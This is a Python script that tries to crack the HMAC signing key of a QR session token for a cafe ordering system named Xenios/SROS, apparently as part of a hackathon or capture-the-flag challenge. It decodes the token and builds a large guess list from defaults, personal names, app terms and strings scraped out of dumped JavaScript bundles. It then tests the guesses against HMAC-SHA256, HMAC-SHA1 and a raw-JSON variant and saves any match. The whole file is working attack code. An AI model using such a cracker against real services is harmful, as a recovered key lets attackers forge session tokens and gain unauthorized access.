#!/usr/bin/env python3
"""Massive HMAC key cracker for Xenios QR token - Phase 1"""
import base64, hashlib, hmac, json, re, os, glob

# THE ACTUAL TOKEN from the challenge
token = "eyJ0IjoiYTAwMDAwMDEtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAxIiwiZXhwIjoxNzgxNzE0MTExODIwfQ.LwJ4IG7rKj68_jnfZ9zDzw-1HpoRG77C3rb-Y0CHmJs"

parts = token.split('.')
payload_b64 = parts[0]
sig_b64 = parts[1]

def b64url_to_b64(s):
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - (len(s) % 4)
    if pad != 4:
        s += '=' * pad
    return s

sig_raw = base64.b64decode(b64url_to_b64(sig_b64))
payload_decoded = base64.b64decode(b64url_to_b64(payload_b64)).decode()
print(f"Payload: {payload_decoded}")
print(f"Sig hex: {sig_raw.hex()}")
print(f"Sig bytes: {len(sig_raw)}")
print()

# Build wordlist
w = set()

base_words = [
    "sros", "xenios", "dejavu", "cafe", "hackme", "hackathon",
    "DEMOA", "DEMOB", "BRB1jRSEl2734dd3Ww9KP", "n7k3", "xtra",
    "admin", "password", "secret", "qwerty", "letmein",
    "SROS", "XENIOS", "DejaVu", "CafeDejaVu", "hackme.xenios.in",
    "xenios.in", "security", "test", "demo", "arena", "hack1", "hack2", "hack3",
    "a0000001-0000-0000-0000-000000000001",
    "a0000001-0000-0000-0000-000000000002",
    "a0000001-0000-0000-0000-000000000003",
    "1781714111820", "2026", "0617", "1706",
    "qr_sess", "sros_token", "sros_staff",
    "admin123", "root", "toor", "welcome", "changeme",
    "access", "granted", "token", "key", "hmac", "jwt",
    "XENIOS2026", "HackArena", "Vault", "Patio", "Main",
    "A-T1", "A-T2", "HACK-1", "HACK-2", "HACK-3",
    "arena-hack1", "arena-hack2", "arena-hack3",
    "GIZMOIOT", "INNOVATIONS", "gizmoiot",
    "white-label", "whitelabel",
    "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999", "0000",
    "1234", "4321", "6969", "1337",
    "XENIOS_HMAC", "xenios_hmac", "XENIOS_SECRET", "xenios_secret",
    "SROS_KEY", "sros_key", "SROS_SECRET", "sros_secret",
    "CafeDejaVu", "cafedejavu", "DEJAVU",
    "1001", "1002", "9001",
    "pass", "pass123", "admin1", "administrator", "guest",
    "test123", "demo123", "hack", "hacking", "breach",
    "bypass", "geofence", "sandbox", "exploit", "pwned",
    "flag", "CTF", "capture", "prize", "10000",
    "11111111-1111-1111-1111-111111111111",
    "hmac_secret", "jwt_secret", "jwt_key", "signing_key", "signing_secret",
    "app_secret", "api_secret", "api_key", "encryption_key",
    "sros_hmac", "sros_jwt", "xenios_jwt", "xenios_hmac",
    "kitchen", "waiter", "manager", "admin", "staff", "owner",
    "service", "restaurant", "order", "table", "menu",
    "dashboard", "watch", "live", "floor", "panel",
    "cafe_deja_vu", "cafe-deja-vu", "SROSkey", "xenioskey", "dejavukey",
    "xenios2026", "dejavu2026", "hackme2026",
    "hashir", "vaibhav", "srivastava",
    "auth", "login", "logout", "session",
    "checkin", "recall", "checkout",
    "pizza", "lasagna", "chocolate", "tiramisu",
    "pickle", "b7f23b0c", "e9a85915", "6b29e004",
    "c1111111", "GET", "POST", "PATCH", "DELETE",
    "nextjs", "nginx", "ubuntu",
    "tauri", "svelte", "app", "page",
    "mains", "beverages", "dessert", "continental", "bev",
]
w.update(base_words)

# Extract from JS
for f in glob.glob("/workspaces/cafe/js_dumps/chunk_*.js"):
    with open(f, 'r', errors='ignore') as fh:
        c = fh.read()
    for s in re.findall(r'"([^"]{3,40})"', c):
        w.add(s)
    for s in re.findall(r"'([^']{3,40})'", c):
        w.add(s)

# Case variants
for k in list(w):
    if 3 <= len(k) <= 64:
        w.add(k.lower())
        w.add(k.upper())
        w.add(k.capitalize())

w = sorted([x for x in w if isinstance(x, str) and 3 <= len(x) <= 64])
w = list(dict.fromkeys(w))

print(f"Wordlist: {len(w)} words")

# Test HMAC-SHA256 (standard)
for key in w:
    h = hmac.new(key.encode(), payload_b64.encode(), hashlib.sha256)
    if h.digest() == sig_raw:
        print(f"\n✅ FOUND: {repr(key)}")
        with open("hmac_key.txt", "w") as f:
            f.write(key)
        exit(0)

print("❌ SHA256: not found")

# Test SHA-1
for key in w:
    h = hmac.new(key.encode(), payload_b64.encode(), hashlib.sha1)
    if h.digest() == sig_raw:
        print(f"\n✅ FOUND (SHA1): {repr(key)}")
        with open("hmac_key.txt", "w") as f:
            f.write(key)
        exit(0)

print("❌ SHA1: not found")

# Test raw JSON payload SHA256
raw = '{"t":"a0000001-0000-0000-0000-000000000001","exp":1781714111820}'
for key in w:
    h = hmac.new(key.encode(), raw.encode(), hashlib.sha256)
    if h.digest() == sig_raw:
        print(f"\n✅ FOUND (raw JSON): {repr(key)}")
        with open("hmac_key.txt", "w") as f:
            f.write(key)
        exit(0)

print("❌ raw JSON: not found")
print("\n✗ All attempts failed. HMAC key is not in our wordlist.")